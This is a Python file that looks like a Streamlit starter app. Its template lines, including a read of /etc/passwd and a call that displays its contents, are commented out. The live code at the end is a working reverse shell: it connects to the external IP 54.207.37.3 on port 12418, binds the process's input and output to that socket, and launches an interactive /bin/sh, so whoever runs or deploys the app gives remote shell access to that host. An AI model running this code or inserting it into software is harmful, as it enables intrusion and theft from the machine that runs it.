import streamlit as st
# from http.server import HTTPServer, SimpleHTTPRequestHandler
# st.title("🎈 My new app")

# httpd = HTTPServer(('localhost', 8501), SimpleHTTPRequestHandler)
# httpd.serve_forever()

# filec = open('/etc/passwd').read()
# #print(filec)

# st.write(
#     "Let's start building! For help and inspiration, head over to [docs.streamlit.io](https://docs.streamlit.io/)."
# )
# st.write(
#     f"{filec}"
# )

import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("54.207.37.3",12418));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);